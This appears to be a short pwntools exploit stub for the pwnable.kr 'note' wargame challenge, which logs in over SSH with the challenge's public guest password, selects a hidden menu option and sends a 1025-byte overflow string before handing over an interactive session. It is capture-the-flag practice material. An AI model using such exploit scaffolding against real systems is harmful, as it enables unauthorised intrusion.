#!/usr/bin/env python3
from pwn import *
from sys import argv
context.arch='i386'
binary = ELF('note.patch', checksec=0)
#libc = ELF()
if len(argv) >= 2 and argv[1] == '-r':
  r = ssh(host='pwnable.kr', user='note', password='guest', port=2222)
  p = r.process('/home/note/note')
else:
  p = binary.process(env={})
s = lambda x, r="" : \
  p.sendafter(r, x) if r else p.send(x)
sl = lambda x, r="" : \
  p.sendlineafter(r, x) if r else p.sendline(x)

pause()
sl(b'201527', b'exit\n')
s(b'A'*1025, b'pwn this\n')
p.interactive()

